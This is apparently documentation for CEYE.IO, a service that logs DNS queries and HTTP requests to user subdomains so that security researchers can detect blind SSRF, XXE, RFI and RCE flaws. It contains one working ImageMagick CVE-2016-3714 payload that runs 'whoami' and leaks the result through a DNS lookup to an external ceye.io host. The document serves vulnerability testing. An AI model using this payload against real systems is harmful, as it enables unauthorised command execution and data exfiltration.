# Introduce

CEYE.IO platform, which monitoring DNS queries and HTTP requests through its own DNS server and HTTP server, it can also create custom files as online payloads. It can help security researchers collect information when testing vulnerabilities (e.g. SSRF/XXE/RFI/RCE).

For each user, there is a six random characters unique identifier code and unique subdomain value, it can be found in profile page. All DNS queries and HTTP requests for the subdomain and followings are logged. For example, b182oj is the unique identifier code for someone, and b182oj.ceye.io is his/her subdomain. All DNS quries and HTTP requests for b182oj.ceye.io and *.b182oj.ceye.io will be recorded. All records can export from the server, by processing these access logs, researchers are be able to confirm and improve their research.

## DNS Queries
DNS queries resolve in a number of different ways. In this case, CEYE.IO platform provide a dnsserver to resolve domain - ceye.io. Its nameserver address is set to own server IP, therefore all DNS queries about domain - ceye.io will be sent to own DNS server eventually.

For example, use nslookup to query dnsquery.test.b182oj.ceye.io in terminal, and you will found this querying in record page: 

![](https://images.seebug.org/ceye/dns-query-1.png)

The Remote column recording client ip address, Query Name column recoding domain name client queried, UPDate column show the last time queried, and Count column show how many times querying for this domain. 

![](https://images.seebug.org/ceye/dns-query-2.png)

Also, there is all records detail about b182oj.ceye.io or *.b182oj.ceye.io DNS queries in DNS queries page. In this page, You can clearly or export these records.

CVE-2016–3714 - the RCE vulnerability in ImageMagick, influencing many applications used this componment, but in this case, may be there is no feedback when testing this vulnerability, because of ImageMagick couldn't return any information usually. With CEYE.IO platform, you can send Payload with a specail mark to collect the command execution result returned.

e.g. (cve-2016-3714.mvg)

  push graphic-context
  viewbox 0 0 640 480
  fill 'url(https://example.com/"|ping `whoami`.rce.imagemagick.b182oj.ceye.io")'
  pop graphic-context

whoami will be executed in linux system if this host is vulnerable, and padding its value with .rce.imagemagick.b182oj.ceye.io, ping command will be executed, you will found the result in DNS queries page if succeed: 

![](https://images.seebug.org/ceye/dns-query-3.png)

## HTTP Requests
CEYE.IO platform has own HTTP server to record all requests for user domain name. That can be used to do some interesting things. For example, use curl to request http://httprequest.test.b182oj.ceye.io/hello/?p=httptest in terminal, and you will found this querying in record page: 
![](https://images.seebug.org/ceye/http-request-1.png)

In backend, CEYE.IO platform will record the IP address of client, the URL requested, the User-Agent of client enviroment, etc. You can found the detail in HTTP requests page: 

![](https://images.seebug.org/ceye/http-request-2.png)